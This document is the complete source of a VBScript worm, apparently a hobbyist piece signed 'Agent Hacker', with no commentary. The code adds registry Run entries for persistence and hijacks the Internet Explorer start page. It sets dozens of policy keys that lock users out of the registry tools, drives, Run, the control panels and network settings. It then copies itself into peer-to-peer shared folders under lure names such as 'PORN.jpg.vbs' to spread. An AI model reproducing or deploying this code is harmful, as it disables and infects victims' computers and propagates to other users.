   On Error Resume Next
   Dim AH, Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder
   Set AH = wscript.CreateObject("WScript.Shell")
   Set Fso = CreateObject("scripting.FileSystemObject")
   AH.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32", "C:\Program

   Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
   AH.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "Agent Hacker"
   AH.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start Page", "Agent Hacker"
   AH.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\

   1201", 0, "REG_DWORD"
   AH.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Agent

   Hacker"
   AH.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Shell32", "C:

   \Windows\Shell32.vbs"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives",

   67108863, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1,

   "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", 1,

   "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled

   ", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",

   1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1,

   "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDiskCpl",

   1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegist

   ryTools", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskb

   ar", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolder

   ", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispAppear

   ancePage", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispBackgr

   oundPage", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispScrSav

   Page", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDispSettin

   gsPage", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoNetSetup

   ", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoNetSetup

   IDPage", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoFileSharin

   gControl", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoNetSetup

   SecurityPage", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoSecCpl",

   1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoAdminPage

   ", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoProfilePage

   ", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoPwdPage",

   1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoAddPrinte

   r", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDeletePrin

   ter", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPrinterTa

   bs", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoDevMgrPag

   e", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoFileSysPag

   e", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoVirtMemPa

   ge", 1, "REG_DWORD"
   AH.regwrite "

   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSaveSetti

   ngs", 1, "REG_DWORD"
   Fso.copyfile wscript.scriptfullname, "C:\Program Files\Internet Explorer\PLUGINS\Command32.

   exe.vbs"
   Fso.copyfile wscript.scriptfullname, "C:\windows\Shell32.vbs"
   MyWorm = (WScript.ScriptFullName)
   KMD = ("C:\Program Files\KMD\My Shared Folder")& "\"
   Kazaa = ("C:\Program Files\Kazaa\My Shared Folder") & "\"
   KazaaLiteL = ("C:\Program Files\KaZaA Lite\My Shared Folder") & "\"
   Morpheus = ("C:\Program Files\Morpheus\My Shared Folder") & "\"
   Grokster = ("C:\Program Files\Grokster\My Grokster") & "\"
   BearShare = ("C:\Program Files\BearShare\Shared") & "\"
   Edonkey = ("C:\Program Files\Edonkey2000\Incoming") & "\"
   if fso.folderexists(KMD) then
   fso.copyfile MyWorm, KMD & "PORN.jpg.vbs"
   fso.copyfile MyWorm, KMD & "AH.exe.vbs"
   fso.copyfile MyWorm, KMD & "EMINEM.mp3.vbs"
   end if
   if fso.folderexists(Kazaa) then
   fso.copyfile MyWorm, Kazaa & "PORN.jpg.vbs"
   fso.copyfile MyWorm, Kazaa & "AH.exe.vbs"
   fso.copyfile MyWorm, Kazaa & "EMINEM.mp3.vbs"
   end if
   if fso.folderexists(KazaaLite) then
   fso.copyfile MyWorm, KazaaLite & "PORN.jpg.vbs"
   fso.copyfile MyWorm, KazaaLite & "AH.exe.vbs"
   fso.copyfile MyWorm, KazaaLite & "Slipknot.mp3.vbs"
   end if
   if fso.folderexists(Morpheus) then
   fso.copyfile MyWorm, Morpheus & "Sex.jpg.vbs"
   fso.copyfile MyWorm, Morpheus & "Games.exe.vbs"
   fso.copyfile MyWorm, Morpheus & "EMINEM.mp3.vbs"
   end if
   if fso.folderexists(Grokster) then
   fso.copyfile MyWorm, Grokster & "vagina.jpg.vbs"
   fso.copyfile MyWorm, Grokster & "Cool-Games.exe.vbs"
   fso.copyfile MyWorm, Grokster & "Friday-I'm-in-love.mp3.vbs"
   end if
   if fso.folderexists(BearShare) then
   fso.copyfile MyWorm, BearShare & "Freesex.jpg.vbs"
   fso.copyfile MyWorm, BearShare & "Motor-games.exe.vbs"
   fso.copyfile MyWorm, BearShare & "House-of-Pain.mp3.vbs"
   end if
   if fso.folderexists(Edonkey) then
   fso.copyfile MyWorm, Edonkey & "Porn_girl.jpg.vbs"
   fso.copyfile MyWorm, Edonkey & "Love.exe.vbs"
   fso.copyfile MyWorm, Edonkey & "AH_my_honey.mp3.vbs"
   msgbox "Coded By Agent Hacker...", vbinformation, "Agent Hacker"
   end if
